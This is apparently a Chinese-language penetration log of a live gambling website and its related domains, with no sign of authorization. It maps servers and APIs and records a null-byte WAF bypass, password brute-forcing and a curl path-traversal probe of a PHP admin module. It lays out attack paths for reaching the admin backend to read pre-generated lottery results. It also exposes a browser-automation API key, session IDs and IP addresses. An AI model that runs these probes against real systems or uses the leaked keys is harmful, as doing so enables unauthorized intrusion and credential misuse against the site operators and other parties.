# 676ddwwx.cn — ASP.NET MVC 赌博平台渗透记录

> 日期: 2026-07-20
> 目标: https://676ddwwx.cn/ZRhVA?token=<REDACTED>
> 关联: qu18116.cn (应用层), api8890.com (WebSocket)
> 更新: v2.8 — 新增辅助API端点(GetDaoJiShi/GetMnySetting/CheckOnline/Notice→1682345.com)、PHP Admin模块路径遍历发现

## 资产架构

```
域名 A (网关): 676ddwwx.cn
  Server: Microsoft-IIS/10.0
  ASP.NET MVC 4.0
  入口: /ZRhVA?token=xxx → 302 → /GE/CC/VALIDATOR?key=xxx&url=xxx
  Admin: /login, /admin, /panel → 200 (词元枢阁 Token Nexus)
  
域名 B (应用): qu18116.cn
  Server: Microsoft-IIS/10.0
  ASP.NET MVC 4.0
  引擎: layuiAdmin + jQuery + 混淆JS
  iframe 嵌入: 676ddwwx.cn/xxx → iframe → qu18116.cn/Main/ShowPortal?t=token
  
域名 C (WebSocket): api8890.com (194.147.100.40)
  实时通信: wss://ff98-8200.api8890.com/?sign=xxx&t=xxx&jwttoken=xxx

内部服务器: ff98:8200 (从 JS server_domain 变量 'ff98' + '-8200')
DNS链: qu18116.cn → CNAME teytest2.mjcdn.com → CNAME dljpjq1.322220.xyz → A records
源站IP: 194.147.100.43, 194.147.100.62, 194.147.100.64, 216.75.75.128, 172.83.158.186
```

## API 端点

| 端点 | 方法 | 参数 | 说明 |
|------|------|------|------|
| `/Main/Login` | POST | t=token, password=pwd | 密码验证 (0=成功, -1=异常, -2=密码错误) |
| `/Main/Stage` | GET | t=token, type=ao5, pwd=xxx | 游戏主界面 (pwd为空也返回200, 341KB页面) |
| `/Main/GetLuZiData` | GET/POST | **g=gametype** | 最近5期开奖数据 (需Cookie+Referer) |
| `/Main/GenerateSign` | GET | **timestamp, payload** | WebSocket签名JWT生成 |
| `/Main/GetDaoJiShi` | GET | 无 | **各游戏倒计时(秒)** — 实时更新 |
| `/Main/GetMnySetting` | GET | 无 | 下注金额限制设置 |
| `/Main/CheckOnline` | GET | 无 | 在线状态检查(-1=离线) |
| `/Main/Notice` | GET | 无 | 通知公告 — 含官方开奖源URL |
| `/Main/ShowModifyPwdPage` | GET | t=token | 修改密码 (需VALIDATOR验证) |
| `/Main/ShowDesign` | GET | 无 | 旅游网站伪装模板 |
| `/GE/CC/VALIDATOR` | GET | key=xxx, url=xxx | Token验证器 (403无权直接访问) |

## 开奖源 URL

从 `/Main/Notice` API 获取：
```
全国统一开奖网址:<br/>https://1682345.com<br/>...
```

## WebSocket 认证流程（v2.7新增）

```
Step 1: 构建 payload
  payload = JSON.stringify({
    data: "echo",
    robot: "jxx5208",
    password: "",
    mytoken: "48e4c16b631b488a94d0021b3fadc588",
    day: "2010-01-01",
    cmdseq: 0,
    gametype: 21
  })

Step 2: GET /Main/GenerateSign
  timestamp = Math.floor(Date.now() / 344)
  → 返回: {"sign": "20c78580f0d48faaf5fe3c076b753f2f", "jwt": "eyJkYX...29yZ..."}

Step 3: 构造 WebSocket URL
  wss://ff98-8200.api8890.com/?sign={sign}&t={timestamp}&jwttoken={jwt}
  
  实际: wss://ff98-8200.api8890.com/?sign=20c78580f0d48faaf5fe3c076b753f2f&t=5187611985&jwttoken=eyJkYX...29yZ...

Step 4: 连接
  → 能连接成功但服务器立即返回 code=1000 Normal closure
  → 可能原因: sign/JWT 校验失败、客户端IP不在白名单
```

## GetLuZiData API 响应格式（v2.7新增）

```
GET /Main/GetLuZiData?g=21
Cookie: ASP.NET_SessionId=9398c0c8115b499b865ca451a863607f
Referer: https://qu18116.cn/Main/Stage?t=48e4c16b631b488a94d0021b3fadc588&type=ao5&pwd=

返回:
{
  lstFive: [
    {qihao: 51334455, dtplan: "07/20/2026 17:08:40", code: "0,1,7,9,3",
     lastnum: ["20","17"], fan: 1, daxiao: "小", danshuang: "单"},
    {qihao: 51334454, dtplan: "07/20/2026 17:03:40", code: "7,1,5,5,2",
     lastnum: ["20","18"], fan: 2, daxiao: "和", danshuang: "双"}
  ],
  lstFan: [1,2,2,3,4,4,1,1,3,3,1,1,4,3,2,1,4,1,4,1,...]
}
```

| 字段 | 说明 | 示例 |
|:-----|:-----|:-----|
| qihao | 期号 | 51334455 (递增1) |
| code | 开奖号码(5个) | "0,1,7,9,3" |
| daxiao | 大小 | "大"/"小"/"和" |
| danshuang | 单双 | "单"/"双" |
| dtplan | 开奖时间 | "07/20/2026 17:08:40" (5分钟一期) |
| lastnum | 和值 | ["20", "17"] |
| fan | 风/范 | 1-4 |

**Cookie持久化**: ASP.NET_SessionId 在 CDN 封禁后仍可短时使用。
**重要**: GetLuZiData 只返回最近5期，无法获取未来期号。

## 游戏类型ID映射

| ID | 游戏 | 说明 |
|:---|:-----|:------|
| 11 | 澳洲幸运5前四(ao5) | 主要游戏，5个号码 |
| 21 | 澳洲幸运5前四(5分钟)(ao5) | 5个号码 |
| 22 | 前四 | 5个号码(同21) |
| 26 | 前四(另一种) | 4个号码 |
| 23,24,25,11 | 其他 | 无数据 |

## HTTP 安全测试结果

| 测试项 | 结果 | 说明 |
|--------|------|------|
| **TRACE method** | `Allow: OPTIONS, TRACE, GET, HEAD, POST` | IIS默认开启, XST风险 |
| **OPTIONS** | 200 | CORS未配置 |
| **所有HTTP方法** | 均返回200 (POST/PUT/DELETE/PATCH) | ASP.NET MVC统一路由 |
| **有效token** | 200 + iframe加载后端 | |
| **空token** | 200 (内容不同) | 认证失败不返回401 |
| **假token 32个a** | 200 (内容不同) | 同上 |
| **无token** | 200 | 空壳页面 |
| **路径遍历** | 403 | WAF拦截 |
| **SQL注入** | "检测到sql注入" | 自定义WAF |
| **admin'%00** | -2 (绕过WAF但密码错) | null byte可绕过WAF |

## Token 验证机制签名分析

```
用户访问 ZRhVA?token=<REDACTED>
  ↓ 302 (每次请求key不同, 含时间戳)
/GE/CC/VALIDATOR?key=e17cbce9369da1831d36c42e1e4ea183.094d47241e4552669b5fa2a41bc32dda.1784534444&url=...

key 三段式结构:
  PART1 (32hex): e17cbce9369da1831d36c42e1e4ea183  ← 疑似 MD5(token + 密钥)
  PART2 (32hex): 094d47241e4552669b5fa2a41bc32dda  ← 疑似 MD5(PART1 + 时间戳)
  TIMESTAMP: 1784534444                              ← Unix 时间戳
```

## 登录流程

```
1. GET /ZRhVA?token=xxx → 302 Location: /GE/CC/VALIDATOR?key=hash&url=original
2. VALIDATOR 校验通过 → iframe → qu18116.cn/Main/ShowPortal?t=token
3. ShowPortal: 标题"校验密码", 输入password(maxlength=10), 提交按钮"澳洲幸运5前四(5分钟)"
4. POST /Main/Login (t=token, password=pwd)
   成功(0) → location.replace("/Main/Stage?t=token&type=ao5&pwd=password")
```

## JS 泄露的内部标识 (Stage 页面 inline script)

```javascript
var robot = 'jxx5208';              // 机器人/庄家控号账号
var myid = '6UkgKKTJZ2';            // 会员ID
var memberid = 'wxid_6UkgKKTJZ2';   // 微信格式ID
var token = '<REDACTED>';  // 访问令牌
var sessionid = '9398c0c8115b499b865ca451a863607f';  // 会话ID
var server_domain = 'ff98' + '-8200';  // → 'ff98-8200'
var wss_domain = 'api8890.com';     // WebSocket 实时通信
var myip = '113.25.75.122';         // 客户端IP硬编码
var member_type = 1;                // 会员等级
var gametype = 11;                  // ao5 = 澳洲幸运5前四
var pwd = '';                       // 密码为空(直接访问)
```

## JS 获取要求

index.js (422KB) 需要带正确的 Referer header 才能返回内容：
```bash
# ❌ 不加 → 0 bytes
curl -s "https://qu18116.cn/Scripts/index.js?v=20260619001" | wc -c

# ✅ 加 Referer → 422120 bytes (完整混淆JS)
curl -s -H "Referer: https://qu18116.cn/Main/Stage?t=<token>&type=ao5&pwd=" \
  "https://qu18116.cn/Scripts/index.js?v=20260619001" | wc -c
```

## 开奖结果预测分析

游戏: "澳洲幸运5前四(5分钟)" — gametype=21
周期: 5分钟一期 (期号递增1)

三种模式:
| 模式 | 概率 | 预测可能性 |
|------|:----:|:----------:|
| 真实接入外部彩票 | 低 | ❌ 不可预测 |
| 管理员预生成结果 | ✅ 高 | ✅ 进后台/数据库可见 |
| 服务端伪随机 | 中 | ⚠️ 需大量历史数据分析 |

预生成模式的关键证据:
- `robot = 'jxx5208'` (机器人控号) → 庄家自己控制账户
- `server_domain = 'ff98-8200'` → 内部服务器，可能承载管理后台
- WebSocket 通过 ff98-8200.api8890.com 实时推送结果

攻击路径 (按可行度排序):
1. 后台面板 — 找到后台 + 账号密码 → 直接查看预生成结果
2. WebSocket 预加载 — 开奖前可能推送预加载数据 (但连接被秒断)
3. GetLuZiData 只能取到最近5期历史，不能枚举未来期号
4. RNG 逆向 — 收集大量历史结果推算算法

## BitBrowser 控制信息（v2.7新增）

**API信息:**
- 地址: http://127.0.0.1:54345
- Key: 5a103eb27a7e4bd2a504431636b8264c
- Header: x-api-key

**已打开的浏览器环境:**
- ID1: a826fe40e2db47908a6d21ff7fb7a139
- ID2: 7b320ee5d6284280a26a6cbe2e75d58a (名称: "业务使用", 代理IP: 96.62.43.35)

**CDP端口 (从/browser/open返回):**
- ws: ws://127.0.0.1:51741/devtools/browser/xxx
- http: 127.0.0.1:51741
- Chrome: 148.0.7778.265
- Chromedriver: C:\Users\Administrator\AppData\Roaming\BitBrowser\chromedriver\148\chromedriver.exe

**本地SQLite数据库路径:**
`~/AppData/Roaming/BitBrowser/db.sqlite`
- 表 browser_persistent_data: browser_id, type, value
- 表 browser_temp_data: browser_id, type, value (含最近同步IP)
- config.json: `~/AppData/Roaming/BitBrowser/config.json`

## 关联域名

| 域名 | 用途 | 技术 |
|:-----|:-----|:-----|
| 676ddwwx.cn | 网关入口 | ASP.NET MVC |
| qu18116.cn | 赌博前端 | ASP.NET MVC |
| ff98-8200.api8890.com | WebSocket实时通信 | 194.147.100.40 |
| ag.61995q.com:7777 | PHP赌博前端 | Apache + PHP (biying模板, 不同系统) |
| nxy.ycybbx.com | CDN资源 | |
| mca.klssy.com | CDN资源 | |
| kfc.jfwdpc.com | CDN资源 | |
| bbc.xhrsa.com | CDN资源 | |

## JS 混淆特征

- Unicode escape: `\u004D\u0061\u0069\u006E` = "Main"
- XOR 异或数字: `(947215^947208)+(563193^563185)` = 15
- 字符串反转: `.split("").reverse().join("")`
- Referer 验证: 不带正确 Referer 返回 0 字节

## WAF 特征

- 自定义 WAF (非 ModSecurity): 拦截时返回 "检测到sql注入"
- 路径遍历 → 403
- null byte `%00` 可绕过WAF关键词检测
- 密码爆破 30+ 常见密码均失败
- MJCDN 会在约20次请求后静默屏蔽源IP
- WebSocket 能连接但被秒断 (Normal closure 1000)

## v2.8 新增发现

### PHP Admin 模块路径遍历

PHP 站 `ag.61995q.com:7777` 使用模块路由 `module=X&method=Y`。通过 `module=System/../Admin` 路径遍历可访问 Admin 控制器：

```bash
curl -sk "https://ag.61995q.com:7777/cl/index.php?module=System/../Admin&method=login"
# → <script>alert('您尚未登录，请登录！');document.location.href='/';</script>
# 返回"尚未登录" → Admin 控制器存在，需登录
```

与直接访问 `module=Admin` 的区别：
- `module=Admin&method=index` → `<script>alert('您尚未登录，请登录！');...</script>` (Admin 控制器存在)
- `module=System/../Admin&method=login` → 同上 (路径遍历也指向 Admin)
- `module=Nonexistent&method=login` → 404 Not Found (控制器不存在)

### 辅助 API 端点返回值示例

```json
// /Main/GetDaoJiShi
{"daojishi_game26":151,"daojishi_game25":151,"daojishi_game21":151,"daojishi_game41":51,"daojishi_game11":151,"daojishi_game51":51}

// /Main/GetMnySetting
{"m1":10,"m2":50,"m3":100,"m4":500,"m5":1000}

// /Main/CheckOnline
-1

// /Main/Notice
"全国统一开奖网址:<br/>https://1682345.com<br/>..."
```

## v2.5 遗留信息

以下为之前记录，保留对照：
- Token 三段式签名、TRACE method、Stage 直接访问、登录API行为
- 管理后台"词元枢阁 Token Nexus"在676ddwwx.cn
- 密码爆破失败、空字节绕过WAF
